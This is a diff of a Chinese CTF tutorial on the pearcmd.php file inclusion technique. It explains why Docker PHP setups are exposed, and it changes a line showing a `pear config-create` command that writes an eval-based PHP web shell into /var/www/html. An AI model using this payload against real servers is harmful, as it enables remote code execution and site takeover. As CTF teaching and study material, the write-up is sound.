@@ -19,6 +19,7 @@ Pear 的本质是一个命令行工具，pearcmd.php 默认的安装路径为`/u
 2. `php.ini `中`register_argc_argv=On`开启
 
 3. 存在文件包含
+
 在 Docker 环境下 register_argc_argv=On 默认开启，且 Docker 下任意版本都安装了 pear。只需要在 Docker 环境下构建一个存在文件包含的场景就可以了。  
 
 大部分的 CTF 题目都是在 Docker 环境中搭建的，由于 Docker 环境中任何 PHP 版本都会自带 pear 和开启 register_argc_argv，因此只要出现了文件包含，就可以利用这个漏洞 getshell，并且绝大多数情况都可以绕过题目的限制。
@@ -29,12 +30,11 @@ Pear 的本质是一个命令行工具，pearcmd.php 默认的安装路径为`/u
 
 - 可以用/usr/local/lib/php/pearcmd.php执行pear命令
 
-
 **我们先看一下$_SERVER['argv']是怎么传进去的**
 
 （提前准备了一个test文件）
 
-```php
+```php title="test.php"
 <?php
 highlight_file(__FILE__);                                                                                           
 var_dump($_SERVER['argv']);                                                                                     
@@ -80,7 +80,7 @@ $\_SERVER['argv']用加号分割不同变量
 
 先包含pearcmd.php，之后传入的参数会传到$\_SERVER['argv']，又由'+'分割不同argv参数
 
-**相当于**执行了`config-create /<?@eval($_POST['shell']);?> /var/www/html/shell.php`
+**相当于**执行了`pear config-create /<?@eval($_POST['shell']);?> /var/www/html/shell.php`
 
 创建了一个配置文件并且拼接上我们的payload一起写入到指定文件中。
 
